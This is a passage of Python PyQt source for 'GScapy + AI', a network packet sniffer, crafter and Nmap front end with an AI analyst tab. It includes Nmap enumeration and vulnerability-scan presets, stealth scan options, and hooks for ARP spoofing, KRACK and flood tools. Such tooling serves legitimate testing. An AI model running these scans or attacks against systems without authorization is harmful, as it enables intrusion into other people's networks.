        full_text = f"Analyze the following from {tool_name} and summarize potential vulnerabilities or next steps.\n\n--- {header} ---\n{formatted_results}\n--- END ---"
        self.user_input.setText(full_text)
        self.parent.tab_widget.setCurrentWidget(self)

    def _show_ai_settings_menu(self):
        settings_file = "ai_settings.json"
        try:
            settings = {}
            if os.path.exists(settings_file):
                with open(settings_file, 'r') as f: settings = json.load(f)
        except (IOError, json.JSONDecodeError) as e:
            QMessageBox.warning(self, "Error", f"Could not load AI settings: {e}"); return
        menu = QMenu(self)
        provider_group = QActionGroup(self)
        provider_group.setExclusive(True)
        active_provider, active_model = settings.get("active_provider"), settings.get("active_model")

        # Local AI
        local_settings = settings.get("local_ai", {})
        if local_model_name := local_settings.get("model"):
            action = QAction(f"Local: {local_model_name}", self, checkable=True)
            if active_provider == "local_ai": action.setChecked(True)
            action.triggered.connect(lambda chk, p="local_ai", m=local_model_name: self._set_active_ai_provider(p, m))
            provider_group.addAction(action)
            menu.addAction(action)

        # Online Services
        online_menu = menu.addMenu("Online Services")
        online_settings = settings.get("online_ai", {})
        online_options_exist = False
        for name in ["OpenAI", "Gemini", "Grok", "DeepSeek", "Qwen"]:
            if (p_data := online_settings.get(name, {})) and p_data.get("api_key") and p_data.get("model"):
                online_options_exist = True
                action = QAction(f"{name}: {p_data['model']}", self, checkable=True)
                if active_provider == name: action.setChecked(True)
                action.triggered.connect(lambda chk, p=name, m=p_data['model']: self._set_active_ai_provider(p, m))
                provider_group.addAction(action)
                online_menu.addAction(action)
        online_menu.setEnabled(online_options_exist)

        menu.addSeparator()
        menu.addAction("Advanced Settings...", self.parent._show_ai_settings_dialog)
        menu.exec(self.ai_settings_btn.mapToGlobal(self.ai_settings_btn.rect().bottomLeft()))

    def _set_active_ai_provider(self, provider, model):
        settings_file = "ai_settings.json"
        try:
            settings = {}
            if os.path.exists(settings_file):
                with open(settings_file, 'r') as f: settings = json.load(f)
            settings['active_provider'] = provider
            settings['active_model'] = model
            with open(settings_file, 'w') as f: json.dump(settings, f, indent=4)
            QMessageBox.information(self, "AI Model Changed", f"Active model set to:\n{provider}: {model}")
            logging.info(f"AI Provider set to {provider} ({model})")
        except (IOError, json.JSONDecodeError) as e:
            QMessageBox.warning(self, "Error", f"Could not save AI settings: {e}")

# --- Main Application ---
class GScapy(QMainWindow):
    """The main application window, holding all UI elements and logic."""
    def __init__(self):
        """Initializes the main window, UI components, and internal state."""
        super().__init__()
        self.setWindowTitle("GScapy + AI - The Modern Scapy Interface with AI")
        # Construct path to icon relative to the script's location for robustness
        script_dir = os.path.dirname(os.path.realpath(__file__))
        icon_path = os.path.join(script_dir, "icons", "shield.svg")
        self.setWindowIcon(QIcon(icon_path))
        self.setGeometry(100, 100, 1200, 800)

        self.packets_data = []; self.sniffer_thread = None; self.channel_hopper = None
        self.packet_layers = []; self.current_field_widgets = []; self.tcp_flag_vars = {}
        self.tool_results_queue = Queue()
        self.is_tool_running = False
        self.loaded_flood_packet = None
        self.found_networks = {}
        self.active_threads = []
        self.thread_finish_lock = Lock()
        self.finished_thread_count = 0
        self.tool_stop_event = Event()
        self.arp_spoof_current_victim = None
        self.arp_spoof_current_target = None
        self.resource_monitor_thread = None
        self.nmap_last_xml = None
        self.nmap_xml_temp_file = None
        self.aircrack_thread = None
        self.ps_thread_lock = Lock()
        self.ps_finished_threads = 0
        self.bf_ssid_list = []
        self.krack_thread = None
        self.sniffer_packet_buffer = []
        self.sniffer_buffer_lock = Lock()
        self.super_scan_active = False

        self.nmap_script_presets = {
            "HTTP Service Info": ("http-title,http-headers", "", "Gathers the title and headers from web servers."),
            "SMB OS Discovery": ("smb-os-discovery", "", "Attempts to determine the OS, computer name, and domain from SMB."),
            "FTP Anonymous Login": ("ftp-anon", "", "Checks if an FTP server allows anonymous login."),
            "DNS Brute-force": ("dns-brute", "", "Attempts to enumerate DNS hostnames by brute-forcing common subdomain names."),
            "SSL/TLS Certificate Info": ("ssl-cert,sslv2", "", "Retrieves the server's SSL certificate and checks for weak SSLv2 support."),
            "SMTP User Enumeration": ("smtp-enum-users", "smtp-enum-users.methods={VRFY,EXPN,RCPT}", "Attempts to enumerate users on an SMTP server."),
            "Vulnerability Scan (Vulners)": ("vulners", "", "Checks for vulnerabilities based on service versions using Vulners.com. Requires -sV."),
            "SMB Share & User Enum": ("smb-enum-shares,smb-enum-users", "", "Enumerates shared folders and user accounts on an SMB server."),
            "Service Banner Grabbing": ("banner", "", "Connects to open ports and prints the service banner.")
        }

        self.central_widget = QWidget()
        self.setCentralWidget(self.central_widget)
        self.main_layout = QVBoxLayout(self.central_widget)

        self._create_resource_bar()
        self._create_menu_bar(); self._create_status_bar(); self._create_header_bar()
        self._create_main_tabs(); self._create_log_panel(); self._setup_logging()

        self._setup_result_handlers()
        self.results_processor = QTimer(self); self.results_processor.timeout.connect(self._process_tool_results); self.results_processor.start(100)

        # Setup timer for batching sniffer UI updates
        self.sniffer_ui_update_timer = QTimer(self)
        self.sniffer_ui_update_timer.timeout.connect(self._update_sniffer_display)
        self.sniffer_ui_update_timer.start(500) # Update every 500ms

        # Start the resource monitor
        self.resource_monitor_thread = ResourceMonitorThread(self)
        self.resource_monitor_thread.stats_updated.connect(self._update_resource_stats)
        self.resource_monitor_thread.start()

        self._update_arp_target() # Initial population after all widgets are created
        logging.info("GScapy application initialized.")


    def _create_menu_bar(self):
        """Creates the main menu bar (File, Help)."""
        self.menu_bar = QMenuBar(self); self.setMenuBar(self.menu_bar)
        file_menu = self.menu_bar.addMenu("&File")
        file_menu.addAction("&Save Captured Packets", self.save_packets)
        file_menu.addAction("&Load Packets from File", self.load_packets)
        file_menu.addSeparator(); file_menu.addAction("&Exit", self.close)
        help_menu = self.menu_bar.addMenu("&Help")
        help_menu.addAction("&About GScapy", self._show_about_dialog)
        help_menu.addSeparator()
        help_menu.addAction("&AI Settings...", self._show_ai_settings_dialog)
        help_menu.addAction("AI Guide", self._show_ai_guide_dialog)

    def _show_ai_settings_dialog(self):
        """Shows the AI settings dialog."""
        dialog = AISettingsDialog(self)
        dialog.exec()
    def _show_ai_guide_dialog(self):
        """Shows the AI features user guide."""
        dialog = AIGuideDialog(self)
        dialog.exec()

    def get_ai_settings(self):
        """
        Loads AI settings from the JSON file and returns a dictionary
        containing the active provider's details (endpoint, model, api_key).
        """
        settings_file = "ai_settings.json"
        try:
            if not os.path.exists(settings_file):
                # Show settings dialog if no config exists
                if self._show_ai_settings_dialog() == QDialog.DialogCode.Rejected:
                    return None # User cancelled

            with open(settings_file, 'r') as f:
                settings = json.load(f)

            active_provider_name = settings.get("active_provider")
            active_model_name = settings.get("active_model")

            if not active_provider_name or not active_model_name:
                self.ai_assistant_tab.handle_ai_error("No active AI model selected. Please click the settings icon to choose one.")
                return None

            provider_details = {}
            if active_provider_name == "local_ai":
                local_settings = settings.get("local_ai", {})
                provider_details = {
                    "provider": "local_ai",
                    "endpoint": local_settings.get("endpoint"),
                    "model": active_model_name,
                    "api_key": None
                }
            else: # It's an online service
                online_settings = settings.get("online_ai", {})
                provider_data = online_settings.get(active_provider_name, {})
                api_key = provider_data.get("api_key")

                endpoint = ""
                if active_provider_name == "OpenAI":
                    endpoint = "https://api.openai.com/v1/chat/completions"
                # ... (add other online providers here)

                provider_details = {
                    "provider": active_provider_name,
                    "endpoint": endpoint,
                    "model": active_model_name,
                    "api_key": api_key
                }

            if not provider_details.get("endpoint"):
                 self.ai_assistant_tab.handle_ai_error(f"Endpoint for '{active_provider_name}' is missing or not supported yet.")
                 return None

            return provider_details

        except (IOError, json.JSONDecodeError) as e:
            self.ai_assistant_tab.handle_ai_error(f"Error loading AI settings: {e}")
            return None
        except Exception as e:
            self.ai_assistant_tab.handle_ai_error(f"An unexpected error occurred while getting AI settings: {e}")
            return None


    def _show_about_dialog(self):
        about_text = """
        <b>GScapy + AI v3.0</b>
        <p>The Modern Scapy Interface with AI.</p>
        <p>This application provides tools for sniffing, crafting, and analyzing network packets, with AI-powered analysis and guidance.</p>
        <br>
        <p><b>Developer:</b><br>Mohammadmahdi Farhadianfard (ao ga nai 😁)<br>
        mohammadmahdi.farhadianfard@gmail.com</p>
        """
        QMessageBox.about(self, "About GScapy + AI", about_text)

    def _create_status_bar(self):
        self.status_bar = QStatusBar(self); self.setStatusBar(self.status_bar); self.status_bar.showMessage("Ready")

    def _create_resource_bar(self):
        """Creates the top resource monitor bar."""
        resource_frame = QFrame(); resource_frame.setFrameShape(QFrame.Shape.StyledPanel)
        resource_layout = QHBoxLayout(resource_frame)
        resource_layout.setContentsMargins(5, 2, 5, 2)

        # Add Logo and Tooltip
        logo_label = QLabel()
        logo_pixmap = QIcon(os.path.join("icons", "shield.svg")).pixmap(40, 40)
        logo_label.setPixmap(logo_pixmap)
        logo_label.setToolTip("GScapy made by Poorija, Email: mohammadmahdi.farhadianfard@gmail.com")
        resource_layout.addWidget(logo_label)
        resource_layout.addSpacing(15)

        resource_layout.addWidget(QLabel("<b>CPU:</b>"))
        self.cpu_graph = ResourceGraph(color='c')
        self.cpu_graph.setFixedHeight(60)
        self.cpu_graph.setMaximumWidth(250)
        resource_layout.addWidget(self.cpu_graph, 1) # Add stretch factor

        resource_layout.addWidget(QLabel("<b>RAM:</b>"))
        self.ram_graph = ResourceGraph(color='m')
        self.ram_graph.setFixedHeight(60)
        self.ram_graph.setMaximumWidth(250)
        resource_layout.addWidget(self.ram_graph, 1) # Add stretch factor

        if GPUtil:
            resource_layout.addWidget(QLabel("<b>GPU:</b>"))
            self.gpu_graph = ResourceGraph(color='y')
            self.gpu_graph.setFixedHeight(60)
            self.gpu_graph.setMaximumWidth(250)
            resource_layout.addWidget(self.gpu_graph, 1)

        resource_layout.addWidget(QLabel("<b>Disk R/W:</b>"))
        self.disk_label = QLabel("---/--- MB/s"); resource_layout.addWidget(self.disk_label)
        resource_layout.addStretch()

        resource_layout.addWidget(QLabel("<b>Net Sent/Recv:</b>"))
        self.net_label = QLabel("---/--- KB/s"); resource_layout.addWidget(self.net_label)
        resource_layout.addStretch()

        resource_layout.addWidget(QLabel("<b>Refresh:</b>"))
        self.refresh_combo = QComboBox()
        self.refresh_combo.addItems(["1s", "2s", "5s", "Off"])
        resource_layout.addWidget(self.refresh_combo)

        self.main_layout.addWidget(resource_frame)
        self.refresh_combo.textActivated.connect(self._handle_refresh_interval_change)

    def _update_resource_stats(self, stats):
        """Updates the resource labels with new stats from the monitor thread."""
        self.cpu_graph.update_data(stats["cpu_percent"])
        self.ram_graph.update_data(stats["ram_percent"])
        if hasattr(self, 'gpu_graph'):
            self.gpu_graph.update_data(stats.get("gpu_percent", 0))
        self.disk_label.setText(stats["disk_str"])
        self.net_label.setText(stats["net_str"])

    def _handle_refresh_interval_change(self, text):
        """Updates the resource monitor's refresh interval."""
        if not self.resource_monitor_thread:
            return

        if text == "Off":
            self.resource_monitor_thread.pause()
        else:
            interval = int(text.replace('s', ''))
            self.resource_monitor_thread.set_interval(interval)

    def _create_header_bar(self):
        """Creates the top header bar with interface and theme selectors."""
        header_frame = QWidget()
        header_layout = QHBoxLayout(header_frame)
        header_layout.setContentsMargins(0, 5, 0, 5)

        # Interface Selector
        header_layout.addWidget(QLabel("Network Interface:"))
        try:
            ifaces = ["Automatic"] + [iface.name for iface in get_working_ifaces()]
        except Exception as e:
            logging.error(f"Could not get network interfaces: {e}", exc_info=True)
            ifaces = ["Automatic"]
        self.iface_combo = QComboBox()
        self.iface_combo.addItems(ifaces)
        header_layout.addWidget(self.iface_combo)

        header_layout.addStretch()

        # Theme Switcher
        header_layout.addWidget(QLabel("Theme:"))
        self.theme_combo = QComboBox()
        self.theme_combo.addItems([theme.replace('.xml', '') for theme in list_themes()])
        self.theme_combo.textActivated.connect(self._handle_theme_change)
        header_layout.addWidget(self.theme_combo)

        self.main_layout.addWidget(header_frame)

    def _handle_theme_change(self, theme_name):
        theme_file = f"{theme_name}.xml"
        invert_secondary = "light" in theme_name
        apply_stylesheet(QApplication.instance(), theme=theme_file, invert_secondary=invert_secondary)

        # After applying the stylesheet, notify the AI tab to update its themed icons
        if hasattr(self, 'ai_assistant_tab'):
            self.ai_assistant_tab.update_theme()

    def get_selected_iface(self):
        iface = self.iface_combo.currentText()
        return iface if iface != "Automatic" else None

    def _create_main_tabs(self):
        """Creates the main QTabWidget and adds all the tool tabs."""
        self.tab_widget = QTabWidget()
        self.tab_widget.setStyleSheet("""
            QTabWidget::tab-bar {
                alignment: center;
            }
            QTabBar::tab:!selected:!last {
                border-right: 1px solid #444;
            }
        """)
        self.main_layout.addWidget(self.tab_widget)
        self.tab_widget.addTab(self._create_sniffer_tab(), QIcon("icons/search.svg"), "Packet Sniffer")
        self.tab_widget.addTab(self._create_crafter_tab(), QIcon("icons/edit-3.svg"), "Packet Crafter")
        self.tab_widget.addTab(self._create_tools_tab(), QIcon("icons/tool.svg"), "Network Tools")
        self.tab_widget.addTab(self._create_advanced_tools_tab(), QIcon("icons/shield.svg"), "Advanced Tools")
        self.tab_widget.addTab(self._create_wireless_tools_tab(), QIcon("icons/wifi.svg"), "Wireless Tools")

        # The AI Assistant Tab is now its own class
        self.ai_assistant_tab = AIAssistantTab(self)
        self.tab_widget.addTab(self.ai_assistant_tab, QIcon("icons/tool.svg"), "AI Assistant")

        self.tab_widget.addTab(self._create_community_tools_tab(), QIcon("icons/users.svg"), "Community Tools")
        self.tab_widget.addTab(self._create_system_info_tab(), QIcon("icons/info.svg"), "System Info")

    def _create_community_tools_tab(self):
        """Creates the UI for the Scapy Community Tools tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        text_browser = QTextBrowser()
        text_browser.setOpenExternalLinks(True)

        html_content = "<h1>Scapy Community Tools and Projects</h1>"
        html_content += "<p>This is a curated list of awesome tools, talks, and projects related to Scapy, inspired by the <a href='https://github.com/gpotter2/awesome-scapy'>awesome-scapy</a> repository.</p>"

        for category, tools in COMMUNITY_TOOLS.items():
            html_content += f"<h2>{category}</h2>"
            html_content += "<ul>"
            for name, url, description in tools:
                html_content += f"<li><b><a href='{url}'>{name}</a></b>: {description}</li>"
            html_content += "</ul>"

        text_browser.setHtml(html_content)
        layout.addWidget(text_browser)
        return widget

    def _create_log_panel(self):
        """Creates the dockable logging panel at the bottom of the window."""
        log_dock_widget = QDockWidget("Live Log", self)
        log_dock_widget.setAllowedAreas(Qt.DockWidgetArea.BottomDockWidgetArea)
        self.log_console = QPlainTextEdit(); self.log_console.setReadOnly(True)
        log_dock_widget.setWidget(self.log_console)
        self.addDockWidget(Qt.DockWidgetArea.BottomDockWidgetArea, log_dock_widget)

    def _setup_logging(self):
        """Configures the logging system to output to a file and the UI panel."""
        root_logger = logging.getLogger()
        for handler in root_logger.handlers[:]: root_logger.removeHandler(handler)
        file_handler = logging.FileHandler('gscapy.log', mode='w')
        formatter = logging.Formatter('%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')
        file_handler.setFormatter(formatter)
        root_logger.addHandler(file_handler)
        qt_handler = QtLogHandler()
        qt_handler.log_updated.connect(self.log_console.appendPlainText)
        qt_handler.setFormatter(formatter)
        root_logger.addHandler(qt_handler)
        root_logger.setLevel(logging.INFO)

    def _create_sniffer_tab(self):
        """Creates the UI for the Packet Sniffer tab."""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Create the results widget first
        self.packet_list_widget = QTreeWidget()
        self.packet_list_widget.setColumnCount(6)
        self.packet_list_widget.setHeaderLabels(["No.", "Time", "Source", "Destination", "Protocol", "Length"])
        # Make header columns resizable and stretch the last section
        header = self.packet_list_widget.header()
        header.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        header.setStretchLastSection(True)

        # --- Control Panel ---
        control_panel = QFrame()
        control_panel.setObjectName("controlPanel")
        control_panel.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; }")
        control_layout = QHBoxLayout(control_panel)
        control_layout.setContentsMargins(10, 10, 10, 10)
        control_layout.setSpacing(10)

        self.start_sniff_btn = QPushButton(QIcon("icons/search.svg"), " Start Sniffing")
        self.stop_sniff_btn = QPushButton(QIcon("icons/shield.svg"), " Stop Sniffing"); self.stop_sniff_btn.setEnabled(False)
        self.clear_sniff_btn = QPushButton("Clear")
        export_btn = self._create_export_button(self.packet_list_widget)

        control_layout.addWidget(self.start_sniff_btn)
        control_layout.addWidget(self.stop_sniff_btn)
        control_layout.addWidget(self.clear_sniff_btn)
        control_layout.addWidget(export_btn)
        control_layout.addStretch(1)

        control_layout.addWidget(QLabel("BPF Filter:"))
        self.filter_input = QLineEdit()
        self.filter_input.setPlaceholderText("e.g., tcp and port 80")
        control_layout.addWidget(self.filter_input, 2) # Give filter more stretch

        control_layout.addWidget(QLabel("Common:"))
        self.common_filter_combo = QComboBox()
        self.common_filter_combo.addItems(COMMON_FILTERS)
        self.common_filter_combo.textActivated.connect(self.filter_input.setText)
        control_layout.addWidget(self.common_filter_combo)
        layout.addWidget(control_panel)

        # Main splitter for top (list) and bottom (details)
        main_splitter = QSplitter(Qt.Orientation.Vertical)
        main_splitter.addWidget(self.packet_list_widget)

        # Bottom splitter for details tree and hex view
        bottom_splitter = QSplitter(Qt.Orientation.Vertical)

        self.packet_details_tree = QTreeWidget()
        self.packet_details_tree.setHeaderLabels(["Field", "Value"])
        # Make header columns resizable and stretch the last section
        details_header = self.packet_details_tree.header()
        details_header.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        details_header.setStretchLastSection(True)
        bottom_splitter.addWidget(self.packet_details_tree)

        self.packet_hex_view = QTextBrowser()
        self.packet_hex_view.setReadOnly(True)
        # Use a monospaced font for the hex view for proper alignment
        self.packet_hex_view.setFont(QFont("Courier New", 10))
        bottom_splitter.addWidget(self.packet_hex_view)

        bottom_splitter.setSizes([200, 100]) # Initial sizes for tree and hex view

        main_splitter.addWidget(bottom_splitter)
        main_splitter.setSizes([400, 300]) # Initial sizes for packet list and details area
        layout.addWidget(main_splitter)

        # Connect signals
        self.start_sniff_btn.clicked.connect(self.start_sniffing)
        self.stop_sniff_btn.clicked.connect(self.stop_sniffing)
        self.clear_sniff_btn.clicked.connect(self.clear_sniffer_display)
        self.packet_list_widget.currentItemChanged.connect(self.display_packet_details)
        return widget

    def _create_crafter_tab(self):
        """Creates the UI for the Packet Crafter tab."""
        widget = QWidget(); main_layout = QVBoxLayout(widget)
        top_splitter = QSplitter(Qt.Orientation.Horizontal); main_layout.addWidget(top_splitter)
        left_panel = QWidget(); left_layout = QVBoxLayout(left_panel); top_splitter.addWidget(left_panel)
        controls_layout = QHBoxLayout()
        self.proto_to_add = QComboBox(); self.proto_to_add.addItems(AVAILABLE_PROTOCOLS.keys())
        add_btn = QPushButton("Add"); remove_btn = QPushButton("Remove");
        controls_layout.addWidget(self.proto_to_add); controls_layout.addWidget(add_btn); controls_layout.addWidget(remove_btn)
        left_layout.addLayout(controls_layout)

        layer_actions_layout = QHBoxLayout()
        fuzz_btn = QPushButton("Fuzz/Unfuzz Selected Layer"); layer_actions_layout.addWidget(fuzz_btn)
        templates_btn = QPushButton("Templates"); layer_actions_layout.addWidget(templates_btn)
        left_layout.addLayout(layer_actions_layout)

        self.layer_list_widget = QListWidget(); left_layout.addWidget(self.layer_list_widget)
        left_layout.addWidget(QLabel("Packet Summary:")); self.crafter_summary = QPlainTextEdit(); self.crafter_summary.setReadOnly(True); left_layout.addWidget(self.crafter_summary)
        right_panel = QWidget(); right_layout = QVBoxLayout(right_panel)
        right_layout.addWidget(QLabel("Layer Fields")); self.scroll_area = QScrollArea(); self.scroll_area.setWidgetResizable(True)
        self.fields_widget = QWidget(); self.fields_layout = QVBoxLayout(self.fields_widget); self.scroll_area.setWidget(self.fields_widget)
        right_layout.addWidget(self.scroll_area); top_splitter.addWidget(right_panel); top_splitter.setSizes([300, 400])
        send_frame = QFrame(); send_frame.setFrameShape(QFrame.Shape.StyledPanel); main_layout.addWidget(send_frame)
        send_layout = QVBoxLayout(send_frame)
        send_controls_layout = QHBoxLayout()
        send_controls_layout.addWidget(QLabel("Count:")); self.send_count_edit = QLineEdit("1"); send_controls_layout.addWidget(self.send_count_edit)
        send_controls_layout.addWidget(QLabel("Interval:")); self.send_interval_edit = QLineEdit("0.1"); send_controls_layout.addWidget(self.send_interval_edit)
        self.send_btn = QPushButton("Send Packet(s)")
        self.send_cancel_btn = QPushButton("Cancel"); self.send_cancel_btn.setEnabled(False)
        send_controls_layout.addWidget(self.send_btn)
        send_controls_layout.addWidget(self.send_cancel_btn)
        send_layout.addLayout(send_controls_layout)
        self.send_results_widget = QTreeWidget(); self.send_results_widget.setColumnCount(3); self.send_results_widget.setHeaderLabels(["No.", "Sent", "Received"])
        send_layout.addWidget(self.send_results_widget)
        send_layout.addWidget(self._create_export_button(self.send_results_widget))
        add_btn.clicked.connect(self.crafter_add_layer); remove_btn.clicked.connect(self.crafter_remove_layer)
        self.layer_list_widget.currentRowChanged.connect(self.crafter_display_layer_fields)
        templates_menu = QMenu(self)
        for name in PACKET_TEMPLATES.keys():
            action = QAction(name, self); action.triggered.connect(lambda checked, n=name: self.crafter_load_template(n)); templates_menu.addAction(action)
        templates_btn.setMenu(templates_menu)
        self.send_btn.clicked.connect(self.crafter_send_packet)
        self.send_cancel_btn.clicked.connect(self.cancel_tool)
        fuzz_btn.clicked.connect(self.crafter_toggle_fuzz_layer)
        return widget

    def _create_nmap_scanner_tool(self):
        widget = QWidget()
        main_layout = QVBoxLayout(widget)

        # --- Top Control Panel (Target, Ports, Main Actions) ---
        top_controls = QFrame()
        top_controls.setObjectName("controlPanel")
        top_controls.setStyleSheet("#controlPanel { border: 1px solid #444; border-radius: 8px; padding: 5px; }")
        top_layout = QGridLayout(top_controls)

        top_layout.addWidget(QLabel("Target(s):"), 0, 0)
        self.nmap_target_edit = QLineEdit("localhost"); self.nmap_target_edit.setToolTip("Enter target hosts (e.g., scanme.nmap.org, 192.168.1.0/24, 10.0.0-5.1-254)")
        top_layout.addWidget(self.nmap_target_edit, 0, 1, 1, 3) # Span across 3 columns

        top_layout.addWidget(QLabel("Ports:"), 1, 0)
        self.nmap_ports_edit = QLineEdit(); self.nmap_ports_edit.setToolTip("Specify ports (e.g., 22,80,443 or 1-1024). Leave blank for default (top 1024).")
        self.nmap_ports_edit.setPlaceholderText("Default (top 1024)")
        top_layout.addWidget(self.nmap_ports_edit, 1, 1, 1, 3)

        self.nmap_start_btn = QPushButton(QIcon("icons/search.svg"), " Start Scan")
        self.nmap_cancel_btn = QPushButton("Cancel"); self.nmap_cancel_btn.setEnabled(False)
        self.nmap_report_btn = QPushButton("Generate HTML Report"); self.nmap_report_btn.setEnabled(False)
        self.nmap_ai_analyze_btn = QPushButton("Send to AI Analyst"); self.nmap_ai_analyze_btn.setEnabled(False)


        top_layout.addWidget(self.nmap_start_btn, 0, 4)
        top_layout.addWidget(self.nmap_cancel_btn, 1, 4)
        top_layout.addWidget(self.nmap_report_btn, 0, 5)
        top_layout.addWidget(self.nmap_ai_analyze_btn, 1, 5)

        presets_layout = QVBoxLayout()
        all_ports_btn = QPushButton("All Ports")
        all_ports_btn.setToolTip("Set the port range to all 65535 ports.")
        all_ports_btn.clicked.connect(self._nmap_set_all_ports)
        self.super_complete_btn = QPushButton("Super Complete Scan")
        self.super_complete_btn.setToolTip("Set options for a highly comprehensive scan (-sS -A -v -T4 -p 1-65535).")
        self.super_complete_btn.clicked.connect(self._nmap_toggle_super_complete)
        presets_layout.addWidget(all_ports_btn)
        presets_layout.addWidget(self.super_complete_btn)

        top_layout.addLayout(presets_layout, 0, 6, 2, 1)

        main_layout.addWidget(top_controls)

        # --- Detailed Options Panel ---
        options_splitter = QSplitter(Qt.Orientation.Horizontal)

        # Left Side: Scan Types & Timing
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)

        scan_type_box = QGroupBox("Scan Type")
        scan_type_layout = QFormLayout(scan_type_box)
        self.nmap_scan_type_combo = QComboBox()
        self.nmap_scan_type_combo.addItems([
            "SYN Stealth Scan (-sS)", "TCP Connect Scan (-sT)", "UDP Scan (-sU)",
            "FIN Scan (-sF)", "Xmas Scan (-sX)", "Null Scan (-sN)", "Ping Scan (-sn)"
        ])
        self.nmap_scan_type_combo.setToolTip("Select the Nmap scan type. Note: SYN Stealth Scan (-sS) often requires administrator/root privileges.")
        scan_type_layout.addRow(self.nmap_scan_type_combo)
        left_layout.addWidget(scan_type_box)

        timing_box = QGroupBox("Timing Template")
        timing_layout = QFormLayout(timing_box)
        self.nmap_timing_combo = QComboBox()
        self.nmap_timing_combo.setToolTip("T0 (paranoid) to T5 (insane)")
        self.nmap_timing_combo.addItems([
            "T0 (Paranoid)", "T1 (Sneaky)", "T2 (Polite)", "T3 (Normal)", "T4 (Aggressive)", "T5 (Insane)"
        ])
        self.nmap_timing_combo.setCurrentIndex(3) # Default to T3
        timing_layout.addRow(self.nmap_timing_combo)
        left_layout.addWidget(timing_box)
        left_layout.addStretch()

        # Right Side: Detection & Misc Options
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)

        detection_box = QGroupBox("Detection Options")
        detection_grid = QGridLayout(detection_box)
        self.nmap_sv_check = QCheckBox("Service/Version (-sV)"); self.nmap_sv_check.setToolTip("Probe open ports to determine service/version info")
        self.nmap_o_check = QCheckBox("OS Detection (-O)"); self.nmap_o_check.setToolTip("Enable OS detection")
        self.nmap_sc_check = QCheckBox("Default Scripts (-sC)"); self.nmap_sc_check.setToolTip("Run default script scan")
        self.nmap_a_check = QCheckBox("Aggressive Scan (-A)"); self.nmap_a_check.setToolTip("Enables OS detection, version detection, script scanning, and traceroute. May require administrator/root privileges.")
        detection_grid.addWidget(self.nmap_sv_check, 0, 0)
        detection_grid.addWidget(self.nmap_o_check, 0, 1)
        detection_grid.addWidget(self.nmap_sc_check, 1, 0)
        detection_grid.addWidget(self.nmap_a_check, 1, 1)
        right_layout.addWidget(detection_box)

        misc_box = QGroupBox("Miscellaneous Options")
        misc_grid = QGridLayout(misc_box)
        self.nmap_pn_check = QCheckBox("No Ping (-Pn)"); self.nmap_pn_check.setToolTip("Treat all hosts as online -- skip host discovery")
        self.nmap_v_check = QCheckBox("Verbose (-v)"); self.nmap_v_check.setToolTip("Increase verbosity level")
        self.nmap_traceroute_check = QCheckBox("Traceroute (--traceroute)"); self.nmap_traceroute_check.setToolTip("Trace hop path to each host")
        misc_grid.addWidget(self.nmap_pn_check, 0, 0)
        misc_grid.addWidget(self.nmap_v_check, 0, 1)
        misc_grid.addWidget(self.nmap_traceroute_check, 1, 0)
        right_layout.addWidget(misc_box)

        options_splitter.addWidget(left_panel)
        options_splitter.addWidget(right_panel)
        main_layout.addWidget(options_splitter)

        # --- Nmap Scripting Engine (NSE) Options ---
        nse_box = QGroupBox("Nmap Scripting Engine (NSE)")
        nse_layout = QFormLayout(nse_box)

        # Script Presets
        self.nmap_preset_combo = QComboBox()
        self.nmap_preset_combo.setToolTip("Select a preset to automatically fill the script fields below.")
        self.nmap_preset_combo.addItems(["-- Select a Preset --"] + list(self.nmap_script_presets.keys()))
        self.nmap_preset_combo.textActivated.connect(self._handle_nmap_preset_selected)
        nse_layout.addRow("Script Presets:", self.nmap_preset_combo)

        # Category Checkboxes
        self.nmap_nse_vuln_check = QCheckBox("Vulnerability scripts (`vuln`)")
        self.nmap_nse_vuln_check.setToolTip("Run scripts from the 'vuln' category to check for known vulnerabilities.")
        self.nmap_nse_discovery_check = QCheckBox("Discovery scripts (`discovery`)")
        self.nmap_nse_discovery_check.setToolTip("Run scripts from the 'discovery' category to gather more information about the network.")
        self.nmap_nse_safe_check = QCheckBox("Safe scripts (`safe`)")
        self.nmap_nse_safe_check.setToolTip("Run scripts that are considered safe and won't crash services.")

        category_layout = QHBoxLayout()
        category_layout.addWidget(self.nmap_nse_vuln_check)
        category_layout.addWidget(self.nmap_nse_discovery_check)
        category_layout.addWidget(self.nmap_nse_safe_check)
        nse_layout.addRow("Categories:", category_layout)

        # Custom Scripts
        self.nmap_custom_script_edit = QLineEdit()
        self.nmap_custom_script_edit.setPlaceholderText("e.g., http-title,smb-os-discovery")
        self.nmap_custom_script_edit.setToolTip("A comma-separated list of specific scripts to run.")
        nse_layout.addRow("Custom Scripts:", self.nmap_custom_script_edit)

        # Script Arguments
        self.nmap_script_args_edit = QLineEdit()
        self.nmap_script_args_edit.setPlaceholderText("e.g., http.useragent=MyCustomAgent,user=admin")
        self.nmap_script_args_edit.setToolTip("A comma-separated list of arguments for your scripts (e.g., arg1=val1,arg2=val2).")
        nse_layout.addRow("Script Arguments:", self.nmap_script_args_edit)

        # Description Label
        self.nmap_script_desc_label = QLabel("Description: --")
        self.nmap_script_desc_label.setWordWrap(True)
        self.nmap_script_desc_label.setStyleSheet("color: #aaa; padding-top: 5px;")
        nse_layout.addRow(self.nmap_script_desc_label)

        main_layout.addWidget(nse_box)

        # --- Output Console ---
        self.nmap_output_console = QPlainTextEdit()
        self.nmap_output_console.setReadOnly(True)
        self.nmap_output_console.setFont(QFont("Courier New", 10))
        self.nmap_output_console.setPlaceholderText("Nmap command output will be displayed here...")
        main_layout.addWidget(self.nmap_output_console, 1) # Give it stretch factor

        # --- Connections ---
        self.nmap_start_btn.clicked.connect(self.start_nmap_scan)
        self.nmap_cancel_btn.clicked.connect(self.cancel_tool)
        self.nmap_report_btn.clicked.connect(self.generate_nmap_report)
        self.nmap_ai_analyze_btn.clicked.connect(lambda: self.ai_assistant_tab.send_to_analyst("nmap", self.nmap_last_xml, self.nmap_target_edit.text()))


        # Logic to disable/enable options based on selections
        def on_aggressive_toggled(checked):
            self.nmap_sv_check.setDisabled(checked); self.nmap_o_check.setDisabled(checked)
            self.nmap_sc_check.setDisabled(checked); self.nmap_traceroute_check.setDisabled(checked)
